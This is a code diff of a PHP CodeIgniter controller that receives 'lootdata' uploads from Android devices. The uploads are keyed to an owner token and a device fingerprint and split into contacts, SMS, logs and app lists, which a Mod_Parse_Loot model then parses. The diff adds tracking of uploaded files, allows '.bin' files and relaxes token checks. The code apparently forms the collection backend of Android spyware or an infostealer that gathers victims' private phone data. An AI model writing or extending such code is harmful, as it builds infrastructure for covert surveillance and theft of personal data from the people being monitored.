@@ -8,9 +8,9 @@ use App\Models\Mod_Receive;
 use App\Models\Mod_Android;
 use App\Models\Mod_Crypt;
 use App\Models\Mod_User;
+use App\Models\Mod_Uploaded_Files;
+use App\Models\Mod_Log_User_Action;
 use CodeIgniter\API\ResponseTrait;
-//use App\Models\Mod_Log_User_Actions;
-
 
 class Receive extends BaseController
 {
@@ -19,7 +19,7 @@ class Receive extends BaseController
     // Configuration for the file upload logic
     private $uploadConfig = [
         'max_size'      => 104857600, // 10MB
-        'allowed_types' => ['txt', 'enc'],
+        'allowed_types' => ['txt', 'enc', 'bin'],
         'upload_path'   => WRITEPATH . 'uploads/text_dump/',
         'encrypt_name'  => true,
     ];
@@ -27,6 +27,9 @@ class Receive extends BaseController
     // Allowed file categories
     private $allowedCategories = ['contacts', 'logs', 'sms', 'apps'];
 
+    /**
+     * Upload file endpoint
+     */
     public function upload()
     {
         // 1. Validate request method
@@ -42,8 +45,8 @@ class Receive extends BaseController
 
         // 3. Validate required parameters
         $validation = $this->validate([
-            'token' => 'required|min_length[10]|max_length[255]',
-            'print_id' => 'required|integer',
+            'token' => 'required|min_length[8]|max_length[255]',
+            'device_print_id' => 'required|string',
         ]);
 
         if (!$validation) {
@@ -52,7 +55,6 @@ class Receive extends BaseController
 
         // 4. Get and validate file
         $file = $this->request->getFile('lootdata');
-
         if (!$file || !$file->isValid()) {
             return $this->fail($file ? $file->getErrorString() : 'No file uploaded');
         }
@@ -62,8 +64,12 @@ class Receive extends BaseController
             return $this->fail('Invalid file type or size');
         }
 
-        // 6. Move file securely
+        // 6. Get file information BEFORE moving
+        $originalName = $file->getClientName();
         $newName = $file->getRandomName();
+        $fileInfo = $this->extractFileInfo($file, $newName);
+
+        // 7. Move file securely
         if (!$file->hasMoved()) {
             try {
                 $file->move($this->uploadConfig['upload_path'], $newName);
@@ -73,36 +79,48 @@ class Receive extends BaseController
             }
         }
 
-        // 7. Extract file information
-        $fileInfo = $this->extractFileInfo($file, $newName);
-
-        // 8. Log upload
-        $this->logUpload($token, $fileInfo);
-
-        // 9. Get token owner
+        // 8. Get token owner information
         $owner = $this->getTokenOwner($token);
         if (!$owner) {
-            // Clean up orphaned file
             @unlink($this->uploadConfig['upload_path'] . $newName);
             return $this->fail('Invalid token owner');
         }
 
-        // 10. Process file based on category
-        $result = $this->processUploadedFile($newName, $owner, $fileInfo['category']);
+        // 9. Save file attributes to NEW database table via model
+        $fileRecordId = $this->saveFileViaModel($token, $owner, $fileInfo);
 
-        if ($result) {
+        // 10. Process file based on category
+        $result = $this->processUploadedFile($newName, $owner, $fileInfo['category'], $fileRecordId);
+
+        if ($result && $result['success']) {
+            // Update file record status via model
+            if ($fileRecordId > 0) {
+                $this->updateFileStatusViaModel($fileRecordId, 'processed', $result);
+            }
+
             return $this->respondCreated([
                 'status' => 'success',
                 'message' => 'File uploaded and processed successfully',
                 'file_id' => $newName,
+                'file_record_id' => $fileRecordId > 0 ? $fileRecordId : null,
                 'category' => $fileInfo['category'],
                 'timestamp' => date('Y-m-d H:i:s')
             ]);
-        }
+        } else {
+            // Update file record status via model
+            if ($fileRecordId > 0) {
+                $errorMsg = is_array($result) ? ($result['error'] ?? 'Processing failed') : 'Processing failed';
+                $this->updateFileStatusViaModel($fileRecordId, 'failed', ['error' => $errorMsg]);
+            }
 
-        return $this->fail('Failed to process uploaded file');
+            $errorMessage = is_array($result) ? ($result['error'] ?? 'Processing failed') : 'Processing failed';
+            return $this->fail('Failed to process uploaded file: ' . $errorMessage);
+        }
     }
 
+    /**
+     * Token verification endpoint
+     */
     public function token_verify()
     {
         // Validate request method
@@ -110,13 +128,12 @@ class Receive extends BaseController
             return $this->fail('Method not allowed', 405);
         }
 
-        $logModel = new \App\Models\Mod_Log_User_Action();
+        $logModel = new Mod_Log_User_Action();
 
         // Validate required parameters
         $validation = $this->validate([
             'token' => 'required|min_length[8]|max_length[255]',
             'time' => 'required|string'
-//            'time' => 'required|valid_date'
         ]);
 
         if (!$validation) {
@@ -188,11 +205,13 @@ class Receive extends BaseController
             'token_owner' => $tokenData['Token_Owner'],
             'token_expiry' => $tokenData['Token_Expiry'],
             'token_id' => $tokenData['Token_ID'],
-            'token_owner_name' => $userName,
-            'token_owner_email' => $userEmail
+            'token_owner_id' => $this->getTokenOwner($token),
         ]);
     }
 
+    /**
+     * Device print registration endpoint
+     */
     public function device_print()
     {
         if (!$this->request->is('post')) {
@@ -243,7 +262,7 @@ class Receive extends BaseController
             $modelReceive = new Mod_Receive();
             $device_metadata = $modelReceive->make_device_print($sanitizedData);
 
-            $logModel = new \App\Models\Mod_Log_User_Action();
+            $logModel = new Mod_Log_User_Action();
 
             // Get request object
             $request = $this->request;
@@ -258,8 +277,6 @@ class Receive extends BaseController
                 'success'         => 1,
                 'request_url'     => current_url(),
                 'request_method'  => $request->getMethod(),
-
-                // Get from HEADERS using getHeader() method
                 'device_name'     => $request->getHeader('device_name') ?
                     $request->getHeader('device_name')->getValue() :
                     ($input['device_model'] ?? 'Unknown Device'),
@@ -267,12 +284,8 @@ class Receive extends BaseController
                     $request->getHeader('device_type')->getValue() : 'phone',
                 'operating_system'=> $request->getHeader('os') ?
                     $request->getHeader('os')->getValue() : 'Android',
-                // Replace TIME_START with CI's constant
                 'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
-                // REQUEST_TIME_FLOAT from $_SERVER
-//                'execution_time_ms' => round((microtime(true) - $_SERVER['REQUEST_TIME_FLOAT']) * 1000, 2),
             ]);
-
 
             $dev_print = json_decode($device_metadata, true);
 
@@ -295,48 +308,64 @@ class Receive extends BaseController
      * Helper Methods
      */
 
-    private function validateToken($token): bool
+    /**
+     * Save file via model
+     */
+    private function saveFileViaModel(string $token, $owner, array $fileInfo): ?int
     {
-        if (empty($token)) {
-            return false;
+        try {
+            $modelUpload = new Mod_Uploaded_Files();
+
+            $ownerId = is_array($owner) ? ($owner['Token_Owner'] ?? null) : $owner;
+            $devicePrintId = $this->request->getPost('device_print_id');
+
+            $uploadData = [
+                'original_name' => $fileInfo['original_name'],
+                'new_name' => $fileInfo['new_name'],
+                'size' => $fileInfo['size'],
+                'extension' => $fileInfo['extension'],
+                'mime_type' => $fileInfo['mime_type'],
+                'category' => $fileInfo['category'],
+                'token' => $token,
+                'owner_id' => $ownerId,
+                'device_checksum' => $devicePrintId,
+                'device_print_id' => $devicePrintId,
+                'upload_path' => $fileInfo['upload_path']
+            ];
+
+            return $modelUpload->logUpload($uploadData);
+
+        } catch (\Exception $e) {
+            log_message('error', 'Failed to save file via model: ' . $e->getMessage());
+            return null;
         }
-
-        $androidModel = new Mod_Android();
-        $tokenData = $androidModel->token_test($token);
-
-        return $tokenData !== null;
     }
 
-    private function validateFile(File $file): bool
+    /**
+     * Update file status via model
+     */
+    private function updateFileStatusViaModel(int $fileId, string $status, ?array $additionalInfo = null): bool
     {
-        // Check file size
-        if ($file->getSize() > $this->uploadConfig['max_size']) {
+        if ($fileId <= 0) {
             return false;
         }
 
-        // Check file extension
-        $extension = $file->getExtension();
-        if (!in_array($extension, $this->uploadConfig['allowed_types'])) {
+        try {
+            $modelUpload = new Mod_Uploaded_Files();
+            return $modelUpload->updateStatus($fileId, $status, $additionalInfo);
+
+        } catch (\Exception $e) {
+            log_message('error', 'Failed to update file status via model: ' . $e->getMessage());
             return false;
         }
-
-        // Check MIME type
-        $mimeType = $file->getMimeType();
-        $allowedMimes = ['text/plain', 'application/octet-stream'];
-        if (!in_array($mimeType, $allowedMimes)) {
-            return false;
-        }
-
-        // Optional: Add virus scanning here
-        // if (!$this->scanForViruses($file->getPathname())) { ... }
-
-        return true;
     }
 
-    private function extractFileInfo(File $file, $newName): array
+    /**
+     * Extract file information
+     */
+    private function extractFileInfo(\CodeIgniter\HTTP\Files\UploadedFile $file, string $newName): array
     {
         $originalName = $file->getClientName();
-        $parts = explode('_', $originalName);
 
         return [
             'original_name' => $originalName,
@@ -344,44 +373,15 @@ class Receive extends BaseController
             'size' => $file->getSize(),
             'extension' => $file->getExtension(),
             'mime_type' => $file->getMimeType(),
-            'category' => $parts[0] ?? 'unknown',
+            'category' => explode('_', $originalName)[0] ?? 'unknown',
             'upload_path' => $this->uploadConfig['upload_path'] . $newName
         ];
     }
 
-    private function logUpload($token, array $fileInfo)
-    {
-        $modelReceive = new Mod_Receive();
-
-        $logData = [
-            'Up_token' => $token,
-            'Up_file_realname' => $fileInfo['original_name'],
-            'Up_file_name' => $fileInfo['new_name'],
-            'Up_file_size' => $modelReceive->get_file_size($fileInfo['size']),
-            'Up_file_extension' => $fileInfo['extension'],
-            'Up_file_text' => $fileInfo['category'],
-            'Up_time' => date('Y-m-d H:i:s')
-        ];
-
-        $modelReceive->make_upload(
-            $logData['Up_token'],
-            $logData['Up_file_realname'],
-            $logData['Up_file_name'],
-            $logData['Up_file_size'],
-            $logData['Up_file_extension'],
-            $logData['Up_file_text']
-        );
-    }
-
-    private function getTokenOwner($token)
-    {
-        $modelReceive = new Mod_Receive();
-        $owner = $modelReceive->get_token_owner($token);
-
-        return $owner && $owner !== '-0-' ? $owner['Token_Owner'] : null;
-    }
-
-    private function processUploadedFile($filename, $ownerId, $category)
+    /**
+     * Process uploaded file
+     */
+    private function processUploadedFile($filename, $ownerId, $category, $fileRecordId = null)
     {
         if (!in_array($category, $this->allowedCategories)) {
             log_message('warning', "Unknown file category: {$category}");
@@ -389,7 +389,8 @@ class Receive extends BaseController
         }
 
         $modelParse = new Mod_Parse_Loot();
-        $printId = $this->request->getPost('print_id');
+        $devicePrintId = $this->request->getPost('device_print_id');
+        $startTime = microtime(true);
 
         $methodMap = [
             'contacts' => 'get_contacts',
@@ -400,22 +401,100 @@ class Receive extends BaseController
 
         if (isset($methodMap[$category]) && method_exists($modelParse, $methodMap[$category])) {
             try {
-                return $modelParse->{$methodMap[$category]}($filename, $ownerId, $printId);
+                $result = $modelParse->{$methodMap[$category]}($filename, $ownerId, $devicePrintId, $fileRecordId);
+                $durationMs = round((microtime(true) - $startTime) * 1000, 2);
+
+                return [
+                    'success' => true,
+                    'record_count' => $result,
+                    'duration_ms' => $durationMs,
+                    'file_record_id' => $fileRecordId
+                ];
             } catch (\Exception $e) {
                 log_message('error', "Failed to parse {$category}: " . $e->getMessage());
-                return false;
+                return [
+                    'success' => false,
+                    'error' => $e->getMessage(),
+                    'duration_ms' => round((microtime(true) - $startTime) * 1000, 2)
+                ];
             }
         }
 
         return false;
     }
 
+    /**
+     * Validate token
+     */
+    private function validateToken($token): bool
+    {
+        if (empty($token)) {
+            return false;
+        }
+
+        $androidModel = new Mod_Android();
+        $tokenData = $androidModel->token_test($token);
+        return $tokenData !== null;
+    }
+
+    /**
+     * Validate file
+     */
+    private function validateFile(\CodeIgniter\HTTP\Files\UploadedFile $file): bool
+    {
+        // Check file size
+        if ($file->getSize() > $this->uploadConfig['max_size']) {
+            return false;
+        }
+
+        try {
+            // Check file extension
+            $extension = $file->getExtension();
+            if (!in_array($extension, $this->uploadConfig['allowed_types'])) {
+                return false;
+            }
+
+            // Check MIME type
+            $mimeType = $file->getMimeType();
+            $allowedMimes = ['text/plain', 'application/octet-stream'];
+            if (!in_array($mimeType, $allowedMimes)) {
+                return false;
+            }
+        } catch (\Exception $e) {
+            // Fallback validation
+            $originalName = $file->getClientName();
+            $extension = pathinfo($originalName, PATHINFO_EXTENSION);
+
+            if (!in_array($extension, $this->uploadConfig['allowed_types'])) {
+                return false;
+            }
+        }
+
+        return true;
+    }
+
+    /**
+     * Get token owner
+     */
+    private function getTokenOwner($token)
+    {
+        $modelReceive = new Mod_Receive();
+        $owner = $modelReceive->get_token_owner($token);
+        return $owner && $owner !== '-0-' ? $owner['Token_Owner'] : null;
+    }
+
+    /**
+     * Log token verification
+     */
     private function logTokenVerification($token, $time, $ip, $format)
     {
         $modelReceive = new Mod_Receive();
         $modelReceive->make_test_token($token, $time, $ip, $format);
     }
 
+    /**
+     * Decrypt user data
+     */
     private function decryptUserData($cryptModel, $encryptedData)
     {
         if (empty($encryptedData)) {
@@ -434,6 +513,9 @@ class Receive extends BaseController
         }
     }
 
+    /**
+     * Fail validation error helper
+     */
     private function failValidationError($message)
     {
         return $this->respond([
